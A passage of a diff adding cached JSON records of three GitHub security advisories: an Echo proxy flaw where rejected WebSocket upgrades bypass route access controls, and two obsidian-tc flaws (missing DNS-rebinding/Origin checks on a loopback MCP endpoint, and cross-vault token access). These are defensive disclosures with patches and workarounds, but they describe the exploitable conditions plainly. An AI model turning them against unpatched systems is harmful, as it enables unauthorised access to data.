+    "fetched_at": "2026-10-24T10:11:58.043851+00:00",
+    "advisory": {
+      "ghsa_id": "GHSA-cxf3-9h37-7rr8",
+      "cve_id": null,
+      "url": "https://api.github.com/advisories/GHSA-cxf3-9h37-7rr8",
+      "html_url": "https://github.com/advisories/GHSA-cxf3-9h37-7rr8",
+      "summary": "Echo: Rejected WebSocket upgrades can bypass Echo route-level access controls",
+      "description": "## Impact\n\nEcho's Proxy middleware selected a raw tunnel when the client requested a WebSocket upgrade, before validating whether the configured upstream accepted it. If the upstream returned an ordinary HTTP response and kept the connection alive, subsequent HTTP requests on that connection were forwarded directly to the same upstream without passing through Echo's router or route-specific middleware.\n\nThis can bypass authentication or authorization enforced only at Echo's routes. Exploitation requires an accessible proxy route, an upstream that rejects the upgrade without closing the connection, and a target resource on that upstream without independent authorization. The issue does not provide arbitrary-host proxying or bypass the upstream's own authentication.\n\n## Affected versions and patch\n\nThe raw proxy implementation is present throughout the v4 and v5 release lines up to v4.16.0 and v5.4.0. Runtime reproductions confirmed v4.15.0, v4.16.0, v5.0.0 and v5.4.0; source history also shows the missing upgrade-response validation in v4.0.0.\n\nUpgrade to [v4.16.1](https://github.com/labstack/echo/releases/tag/v4.16.1) or [v5.4.1](https://github.com/labstack/echo/releases/tag/v5.4.1). The patch routes WebSocket upgrades through Go's HTTP reverse proxy and enters a tunnel only after a valid upstream upgrade response. Rejected upgrades remain ordinary HTTP requests.\n\nFix commits: [v4](https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f), [v5](https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec).\n\n## Workarounds\n\nReject WebSocket upgrade requests before they reach affected Echo proxy routes, or enforce authorization independently at every upstream resource. Merely returning a non-101 response from the upstream does not prevent the vulnerable raw tunnel.\n\n## Credits\n\nReported by @Duodum.",
+      "type": "reviewed",
+      "severity": "critical",
+      "repository_advisory_url": "https://api.github.com/repos/labstack/echo/security-advisories/GHSA-cxf3-9h37-7rr8",
+      "source_code_location": "https://github.com/labstack/echo",
+      "identifiers": [
+        {
+          "value": "GHSA-cxf3-9h37-7rr8",
+          "type": "GHSA"
+        }
+      ],
+      "references": [
+        "https://github.com/labstack/echo/security/advisories/GHSA-cxf3-9h37-7rr8",
+        "https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec",
+        "https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f",
+        "https://github.com/labstack/echo/releases/tag/v4.16.1",
+        "https://github.com/labstack/echo/releases/tag/v5.4.1",
+        "https://github.com/advisories/GHSA-cxf3-9h37-7rr8"
+      ],
+      "published_at": "2026-10-23T20:49:37Z",
+      "updated_at": "2026-10-23T20:49:38Z",
+      "github_reviewed_at": "2026-10-23T20:49:37Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v4"
+          },
+          "vulnerable_version_range": ">= 4.0.0, < 4.16.1",
+          "first_patched_version": "4.16.1",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v5"
+          },
+          "vulnerable_version_range": ">= 5.0.0, < 5.4.1",
+          "first_patched_version": "5.4.1",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+          "score": 9.1
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-444",
+          "name": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')"
+        },
+        {
+          "cwe_id": "CWE-863",
+          "name": "Incorrect Authorization"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "Duodum",
+            "id": 52959353,
+            "node_id": "MDQ6VXNlcjUyOTU5MzUz",
+            "avatar_url": "https://avatars.githubusercontent.com/u/52959353?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/Duodum",
+            "html_url": "https://github.com/Duodum",
+            "followers_url": "https://api.github.com/users/Duodum/followers",
+            "following_url": "https://api.github.com/users/Duodum/following{/other_user}",
+            "gists_url": "https://api.github.com/users/Duodum/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/Duodum/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/Duodum/subscriptions",
+            "organizations_url": "https://api.github.com/users/Duodum/orgs",
+            "repos_url": "https://api.github.com/users/Duodum/repos",
+            "events_url": "https://api.github.com/users/Duodum/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/Duodum/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    }
+  },
+  "GHSA-pqh8-4pj7-32xx": {
+    "url": "https://api.github.com/advisories/GHSA-pqh8-4pj7-32xx",
+    "fetched_at": "2026-10-24T10:11:58.645153+00:00",
+    "advisory": {
+      "ghsa_id": "GHSA-pqh8-4pj7-32xx",
+      "cve_id": "CVE-2026-77363",
+      "url": "https://api.github.com/advisories/GHSA-pqh8-4pj7-32xx",
+      "html_url": "https://github.com/advisories/GHSA-pqh8-4pj7-32xx",
+      "summary": "obsidian-tc HTTP transport lacks Origin/DNS-rebinding protection, enabling drive-by vault access on loopback",
+      "description": "### Impact\nThe Streamable HTTP transport was constructed without `enableDnsRebindingProtection`/`allowedHosts`/`allowedOrigins` and performed no `Origin`-header validation. With the documented `auth.mode: \"none\"` loopback default, a **drive-by web page could `POST http://127.0.0.1/mcp`** and receive caller `http-local` with scopes `[\"*\"]` — full vault read/write — via DNS rebinding / a forged Origin.\n\n### Patches\nFixed in **1.3.1**. Upgrade to `>= 1.3.1`. The transport now enables DNS-rebinding protection and allowed hosts/origins and returns HTTP 403 on an invalid Origin (per MCP 2025-11-25).\n\n### Workarounds\nDo not expose the HTTP transport with `auth.mode: \"none\"`; require JWT auth, or bind to a non-loopback interface behind a proxy that validates `Origin`.",
+      "type": "reviewed",
+      "severity": "critical",
+      "repository_advisory_url": "https://api.github.com/repos/The-40-Thieves/obsidian-tc/security-advisories/GHSA-pqh8-4pj7-32xx",
+      "source_code_location": "https://github.com/The-40-Thieves/obsidian-tc",
+      "identifiers": [
+        {
+          "value": "GHSA-pqh8-4pj7-32xx",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-77363",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/The-40-Thieves/obsidian-tc/security/advisories/GHSA-pqh8-4pj7-32xx",
+        "https://github.com/The-40-Thieves/obsidian-tc/pull/74",
+        "https://github.com/The-40-Thieves/obsidian-tc/commit/6428bfe6fdfd43aa7b4b369be3aecd6a268fb928",
+        "https://github.com/The-40-Thieves/obsidian-tc/releases/tag/v1.3.1",
+        "https://nvd.nist.gov/vuln/detail/cve-2026-77363",
+        "https://github.com/advisories/GHSA-pqh8-4pj7-32xx"
+      ],
+      "published_at": "2026-10-23T18:29:02Z",
+      "updated_at": "2026-10-23T18:29:05Z",
+      "github_reviewed_at": "2026-10-23T18:29:02Z",
+      "nvd_published_at": "2026-10-12T18:17:23Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "obsidian-tc"
+          },
+          "vulnerable_version_range": "< 1.3.1",
+          "first_patched_version": "1.3.1",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+          "score": 9.6
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-346",
+          "name": "Origin Validation Error"
+        },
+        {
+          "cwe_id": "CWE-1385",
+          "name": "Missing Origin Validation in WebSockets"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "suavecito585",
+            "id": 216850138,
+            "node_id": "U_kgDODOze2g",
+            "avatar_url": "https://avatars.githubusercontent.com/u/216850138?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/suavecito585",
+            "html_url": "https://github.com/suavecito585",
+            "followers_url": "https://api.github.com/users/suavecito585/followers",
+            "following_url": "https://api.github.com/users/suavecito585/following{/other_user}",
+            "gists_url": "https://api.github.com/users/suavecito585/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/suavecito585/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/suavecito585/subscriptions",
+            "organizations_url": "https://api.github.com/users/suavecito585/orgs",
+            "repos_url": "https://api.github.com/users/suavecito585/repos",
+            "events_url": "https://api.github.com/users/suavecito585/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/suavecito585/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder"
+        }
+      ],
+      "comments": 1,
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+        "score": 9.6
+      },
+      "epss": {
+        "percentage": 0.00157,
+        "percentile": 0.04512
+      }
+    }
+  },
+  "GHSA-84c9-qqpq-2pq5": {
+    "url": "https://api.github.com/advisories/GHSA-84c9-qqpq-2pq5",
+    "fetched_at": "2026-10-24T10:11:58.647183+00:00",
+    "advisory": {
+      "ghsa_id": "GHSA-84c9-qqpq-2pq5",
+      "cve_id": "CVE-2026-77366",
+      "url": "https://api.github.com/advisories/GHSA-84c9-qqpq-2pq5",
+      "html_url": "https://github.com/advisories/GHSA-84c9-qqpq-2pq5",
+      "summary": "obsidian-tc tokens can access arbitrary configured vaults",
+      "description": "### Impact\nTool dispatch did not check the caller-supplied `input.vault` against the caller's bound vault (`ctx.vaultId`); the folder ACL was a single global instance and the JWT carried no vault claim. As a result, **any valid token could read, write, or delete any configured vault** by passing `input.vault`, defeating multi-tenant isolation across ~90 tool sites. (`resources/read` was the only surface that already guarded this.)\n\n### Patches\nFixed in **1.3.1** (the fix was developed on the `v1.3.0` tag, which never published to npm; 1.3.1 is the first published release with the fix). Upgrade to `>= 1.3.1`.\n\n### Workarounds\nRun a single vault per server process, or isolate each tenant on a separate process/credential.\n\n### Fix\nA central `input.vault === ctx.vaultId` guard was added in dispatch before the scope check.",
+      "type": "reviewed",
+      "severity": "critical",
+      "repository_advisory_url": "https://api.github.com/repos/The-40-Thieves/obsidian-tc/security-advisories/GHSA-84c9-qqpq-2pq5",
+      "source_code_location": "https://github.com/The-40-Thieves/obsidian-tc",
+      "identifiers": [
+        {
+          "value": "GHSA-84c9-qqpq-2pq5",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-77366",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/The-40-Thieves/obsidian-tc/security/advisories/GHSA-84c9-qqpq-2pq5",
+        "https://github.com/The-40-Thieves/obsidian-tc/pull/72",
+        "https://github.com/The-40-Thieves/obsidian-tc/commit/38b4992e87dc2715564236e1a42d005ab05a0194",
+        "https://github.com/The-40-Thieves/obsidian-tc/releases/tag/v1.3.1",
+        "https://nvd.nist.gov/vuln/detail/cve-2026-77366",
+        "https://github.com/advisories/GHSA-84c9-qqpq-2pq5"
+      ],
+      "published_at": "2026-10-23T17:29:17Z",
+      "updated_at": "2026-10-23T17:29:18Z",
+      "github_reviewed_at": "2026-10-23T17:29:17Z",
+      "nvd_published_at": "2026-10-12T18:17:23Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "obsidian-tc"
+          },
+          "vulnerable_version_range": "< 1.3.1",
+          "first_patched_version": "1.3.1",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+          "score": 9.9
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-639",
+          "name": "Authorization Bypass Through User-Controlled Key"
+        },
+        {
+          "cwe_id": "CWE-863",
+          "name": "Incorrect Authorization"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "suavecito585",
+            "id": 216850138,
+            "node_id": "U_kgDODOze2g",
+            "avatar_url": "https://avatars.githubusercontent.com/u/216850138?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/suavecito585",
+            "html_url": "https://github.com/suavecito585",
+            "followers_url": "https://api.github.com/users/suavecito585/followers",
+            "following_url": "https://api.github.com/users/suavecito585/following{/other_user}",
+            "gists_url": "https://api.github.com/users/suavecito585/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/suavecito585/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/suavecito585/subscriptions",
+            "organizations_url": "https://api.github.com/users/suavecito585/orgs",
+            "repos_url": "https://api.github.com/users/suavecito585/repos",
+            "events_url": "https://api.github.com/users/suavecito585/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/suavecito585/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder"
+        }
+      ],
+      "comments": 1,
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 9.9
+      },
+      "epss": {
+        "percentage": 0.00308,
+        "percentile": 0.21897
+      }
+    }
+  }
+}
